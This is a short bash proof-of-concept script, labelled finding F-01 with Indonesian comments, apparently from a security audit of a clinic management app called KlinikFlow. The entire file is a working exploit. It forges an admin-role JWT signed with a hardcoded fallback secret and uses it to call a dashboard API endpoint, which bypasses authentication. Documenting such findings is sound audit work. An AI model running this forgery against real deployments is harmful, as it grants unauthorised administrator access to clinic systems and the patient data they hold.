#!/usr/bin/env bash
# PoC F-01: forge JWT dengan secret fallback hardcoded.
# Pemakaian: BASE=http://localhost:3000 ./01_jwt_forge.sh
set -euo pipefail
BASE="${BASE:-http://localhost:3000}"
SECRET="${SECRET:-klinikflow-super-secret-jwt-key-2026}"

payload=$(printf '{"id":1,"clinic_id":1,"name":"attacker","email":"a@evil.test","role":"admin","exp":%s}' "$(( $(date +%s) + 86400 ))")
b64() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
header=$(printf '{"alg":"HS256","typ":"JWT"}' | b64)
body=$(printf '%s' "$payload" | b64)
sig=$(printf '%s.%s' "$header" "$body" | openssl dgst -sha256 -hmac "$SECRET" -binary | b64)
TOKEN="$header.$body.$sig"

echo "[*] token palsu (role=admin) dibuat"
echo "[*] GET $BASE/api/dashboard/stats"
curl -s "$BASE/api/dashboard/stats" -H "Authorization: Bearer $TOKEN"
echo
